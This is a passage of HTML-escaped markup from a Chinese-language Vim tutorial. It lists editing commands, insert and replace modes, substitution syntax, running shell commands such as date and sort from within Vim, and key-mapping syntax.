&lt;li&gt;&lt;strong&gt;d$&lt;/strong&gt; &amp;ndash; 删除光标到本行的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;d0&lt;/strong&gt; &amp;ndash; 删除游标所在处到该行的最前面一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dH&lt;/strong&gt; &amp;ndash; 删除屏幕显示的第一行文本到光标所在的行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;d1G&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;所在到第一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dG&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;所在到最后一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;x&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;当前所在的&lt;/strong&gt;字符**(delete)**&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;X&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;前面的一个&lt;/strong&gt;字符**(backspace)**&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nx&lt;/strong&gt; &amp;ndash; 向后连续删除n个字符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;复制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;y 是复制的意思，通常搭配一个字符（复制范围）实现复制的功能，常用的如下：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;yw&lt;/strong&gt; &amp;ndash; 复制一个单词，还有ynw&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yfa&lt;/strong&gt; &amp;ndash; 复制光标到下一个 a 的字符处,还有ynfa&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yy&lt;/strong&gt; &amp;ndash; 复制一行，还有nyy&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;y$&lt;/strong&gt; &amp;ndash; 复制光标到本号的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yH&lt;/strong&gt; &amp;ndash; 复制屏幕显示的第一行文本到光标所在的行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;y1G&lt;/strong&gt; &amp;ndash; 复制&lt;strong&gt;光标所在行到第一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yG&lt;/strong&gt; &amp;ndash; 复制&lt;strong&gt;光标所在行到最后一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;粘贴&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;p是黏贴的意思，当执行完复制或者黏贴的命令以后，VIM 会把文本寄存起来&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;p(小写)&lt;/strong&gt; &amp;ndash; 在光标后开始黏贴&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;P(大写)&lt;/strong&gt; &amp;ndash; 在光标前开始粘贴&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;撤销操作和恢复&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;u&lt;/strong&gt; &amp;ndash; 撤销刚才的操作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+r&lt;/strong&gt; &amp;ndash; 恢复撤销操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;大小写转换&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;~&lt;/strong&gt; &amp;ndash; 将光标下的字母改变大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3~&lt;/strong&gt; &amp;ndash; 将光标位置开始的3个字母改变其大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;g~~&lt;/strong&gt; &amp;ndash; 改变当前行字母的大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gUU&lt;/strong&gt; &amp;ndash; 将当前行的字母改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;guu&lt;/strong&gt; &amp;ndash; 将当前行的字母全改成小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3gUU&lt;/strong&gt; &amp;ndash; 将从光标开始到下面3行字母改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gUw&lt;/strong&gt; &amp;ndash; 将光标下的单词改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;guw&lt;/strong&gt; &amp;ndash; 将光标下的单词改成小写&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;重复操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;.&lt;/strong&gt; &amp;ndash; 重复上一个操作的命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n&amp;lt;command&amp;gt;&lt;/strong&gt; &amp;ndash; 重复某个命令 n 次，如 10p复制 10 次，10dd 删除十次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;J&lt;/strong&gt; &amp;ndash; 将光标所在行与下一行的数据结合成同一行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;c&lt;/strong&gt; &amp;ndash; 重复删除多个数据，例如向下删除 10 行，10cj&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;插入模式&#34;&gt;插入模式
&lt;/h3&gt;&lt;h4 id=&#34;进入插入模式&#34;&gt;进入插入模式
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;命令&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;i, I&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;i &amp;ndash; 从目前光标所在处输入&lt;br /&gt;I &amp;ndash; 在目前所在行的第一个非空格符处开始输入&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;a, A&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;a &amp;ndash; 从目前光标所在的下一个字符处开始输入&lt;br /&gt;A &amp;ndash; 从光标所在行的最后一个字符处开始输入&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;o, O&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;o &amp;ndash; 在目前光标所在的下一行处输入新的一行&lt;br /&gt;O &amp;ndash; 在目前光标所在的上一行处输入新的一行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;s，S&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;s &amp;ndash; 删除光标所在处的字符然后插入需要录入的文本&lt;br /&gt;S &amp;ndash; 删除光标所在行，在当前行的行首开始插入需要录入的文本&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;cw&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;删除&lt;strong&gt;从光标处开始到该单词结束&lt;/strong&gt;的所有字符，然后插入需要录入的文本&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;插入模式的命令&#34;&gt;插入模式的命令
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;必须知道的：&lt;code&gt;#&lt;/code&gt;是vim中的注释符号&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在输入模式中，可以使用以下按键：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;字符按键以及Shift组合&lt;/strong&gt;，输入字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ENTER&lt;/strong&gt;，回车键，换行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;BACK SPACE&lt;/strong&gt;，退格键，删除光标前一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DEL&lt;/strong&gt;，删除键，删除光标后一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;方向键&lt;/strong&gt;，在文本中移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HOME&lt;/strong&gt;/&lt;strong&gt;END&lt;/strong&gt;，移动光标到行首/行尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Page Up&lt;/strong&gt;/&lt;strong&gt;Page Down&lt;/strong&gt;，上/下翻页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Insert&lt;/strong&gt;，切换光标为输入/替换模式，光标将变成竖线/下划线&lt;/li&gt;
&lt;li&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;ESC&lt;/strong&gt;，&lt;strong&gt;退出输入模式，切换到命令模式&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;替换模式&#34;&gt;替换模式
&lt;/h3&gt;&lt;h4 id=&#34;进入替换模式&#34;&gt;进入替换模式
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;R&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;替换模式&lt;/strong&gt;，此时新输入的文本将直接替代/覆盖已经存在的内容，点击ESC键返回常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;r&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;单字符替换模式&lt;/strong&gt;，此时新输入的字符将替代光标之下的当前字符，然后自动返回到常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;gR&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;虚拟替换模式&lt;/strong&gt;，其与替换模式最主要的区别在于，对&amp;lt;Tab&amp;gt;键和换行符的不同处理方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;gr&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;单字符虚拟替换模式&lt;/strong&gt;，在替换光标下的当前字符之后，将自动返回到常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;虚拟替换模式&#34;&gt;虚拟替换模式
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Tab&amp;gt;键&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;替换模式（REPLACE）下，在原有&amp;lt;Tab&amp;gt;键处输入字母&amp;rsquo;a&amp;rsquo;，将&lt;strong&gt;直接替代&amp;lt;Tab&amp;gt;键所占用的所有空格的位置&lt;/strong&gt;&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;https://picx.zhimg.com/v2-ecdbd6903e53640aa3375ecd30287665_b.jpg&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309213229157.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;p&gt;虚拟替换模式（VREPLACE）下，在原有&amp;lt;Tab&amp;gt;键处输入字母&amp;rsquo;a&amp;rsquo;，将&lt;strong&gt;仅仅替代单个空格&lt;/strong&gt;&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;https://picx.zhimg.com/v2-ecdbd6903e53640aa3375ecd30287665_b.jpg&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250310190903275.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;NL&amp;gt;换行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;替换模式（REPLACE）下，输入&amp;lt;Enter&amp;gt;回车键将&lt;strong&gt;增加新行&lt;/strong&gt;：&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214135754.png&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214201236.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;p&gt;虚拟替换模式（VREPLACE）下，输入&amp;lt;Enter&amp;gt;回车键将&lt;strong&gt;用新行替代当前行内容&lt;/strong&gt;（即清空当前行）：&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214135754.png&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309215042518.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;命令模式&#34;&gt;命令模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在命令模式下按下 :（英文冒号）就进入了底线命令模式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;有的命令要输入 / 执行&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;命令模式常用命令&#34;&gt;命令模式常用命令
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:w&lt;/strong&gt; &amp;ndash; 保存文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:q&lt;/strong&gt; &amp;ndash; 退出 Vim 编辑器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:wq&lt;/strong&gt; &amp;ndash; 保存文件并退出 Vim 编辑器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:q!&lt;/strong&gt; &amp;ndash; 强制退出Vim编辑器，不保存修改&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set nu&lt;/strong&gt; &amp;ndash; 显示行号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set nonu&lt;/strong&gt; &amp;ndash; 取消行号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n&lt;/strong&gt; &amp;ndash; 定位到第n行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n1,n2d&lt;/strong&gt; &amp;ndash; 删除行号n1至n2之间的内容（n1和n2都代表数字）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;按 ESC 键可随时退出底线命令模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;命令模式处理文件&#34;&gt;命令模式处理文件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:w [filename]&lt;/strong&gt; &amp;ndash; 将编辑的数据储存成另一个文件（类似另存新档）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:r [filename]&lt;/strong&gt; &amp;ndash; 在编辑的数据中，读入另一个档案的数据，即将filenam的内容加到光标所在行后面&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n1,n2 w [filename]&lt;/strong&gt; &amp;ndash; 将 n1 到 n2 的内容储存成 filename&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式搜索文本&#34;&gt;命令模式搜索文本
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;?{目标字符串}&lt;/strong&gt; &amp;ndash; 向光标之&lt;strong&gt;上&lt;/strong&gt;寻找一个目标字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/{目标字符串}&lt;/strong&gt; &amp;ndash; 向光标之&lt;strong&gt;下&lt;/strong&gt;寻找一个目标字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n&lt;/strong&gt; &amp;ndash; 重复前一个搜寻的动作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;N&lt;/strong&gt; &amp;ndash; &lt;strong&gt;反向&lt;/strong&gt;进行前一个搜寻动作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set ic&lt;/strong&gt; &amp;ndash; 编辑器将不会区分大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set noic&lt;/strong&gt; &amp;ndash; 编辑器将区分大小写&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式替换文本&#34;&gt;命令模式替换文本
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;格式：&lt;/strong&gt;&lt;mark&gt;&lt;strong&gt;:(作用范围)s/{目标}/{替换}(/替换的标志)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;替换的作用范围&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;标志&lt;/th&gt;
          &lt;th&gt;作用&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当前行替换&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;%s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;全文替换&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;n1,n2s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;指定行替换，替换n1到n2间所有行的目标，&lt;strong&gt;n2可以是$，代指最后一行&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&amp;rsquo;&amp;lt;,&amp;rsquo;&amp;gt;s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;指定区域替换&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;替换的标志&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;标志&lt;/th&gt;
          &lt;th&gt;作用&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;[无]&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;只替换作用范围内，&lt;strong&gt;每行第一次出现&lt;/strong&gt;的目标&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;g&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;一次性替换所有&lt;/strong&gt;作用范围内所有的目标&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;i&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;大小写不敏感查找&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;I&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;大小写敏感查找&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;c&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;对作用范围内的目标&lt;strong&gt;逐个替换&lt;/strong&gt;，替换前需进行确认&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;替换标志可以使用多个，比如/gic&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式执行linux命令&#34;&gt;命令模式执行linux命令
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开终端窗口并打印执行命令的结果，不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用&lt;code&gt;:!bash&lt;/code&gt;打开bash shell并执行命令&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:!date		//执行 date 命令显示时间，执行完命令以后按下键盘上的 Enter 就会返回到文件
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:r ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将shell命令command的结果插入到当前行的下一行&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:r !date		//读取系统时间并插入到当前行的下一行
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;n1,n2 ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将n1至n2行范围内的内容交给命令command处理，并将处理结果替换起始行号和结束行号指定范围中的内容&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:1,4 !sort		//将第1行到第4行的内容进行排序
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以只指定起始行&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:1 !tr &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;a-z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;A-Z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;		//将第1行的小写字母转为大写字母
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以用.表示当前光标所在行&lt;/strong&gt;  &lt;strong&gt;(输入&lt;code&gt;!!&lt;/code&gt;会变成&lt;code&gt;:.!&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:. !tr &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;a-z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;A-Z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;		//将当前行的小写转为大写
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;n1,n2 w ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将起始行号和结束行号所指定范围的内容作为命令command的输入，不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用&lt;code&gt;:1 w !bash&lt;/code&gt;，将会把第1行的内容作为bash命令来执行并显示结果，而且不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;同样的 &lt;code&gt;: . w !bash&lt;/code&gt;将当前行的内容作为bash命令来执行&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;!!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重新执行最近一次运行过的命令&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:shell&lt;/strong&gt; / &lt;strong&gt;:terminal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开命令终端（输入exit结束并返回vim）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用&lt;code&gt;:version&lt;/code&gt;命令（按&lt;code&gt;q&lt;/code&gt;退出），查看是否包含+terminal关键字，以确认是否能使用 &lt;code&gt;:terminal&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式定义快捷键&#34;&gt;命令模式定义快捷键
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基本格式&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;模式&lt;/th&gt;
          &lt;th&gt;基本格式&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;普通模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:nmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;仅在普通模式下有效，定义普通模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;插入模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:imap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义插入模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;可视模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:vmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义可视模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;命令行模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:cmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义命令行模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;总体映射&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:map &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;定义快捷键，适用于普通、可视、操作和选择模式，但不建议用于有冲突的情况。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;总体不可递归映射&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:noremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;类似&lt;code&gt;:map&lt;/code&gt;，但是不会递归地扩展已经存在的映射，避免意外行为。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
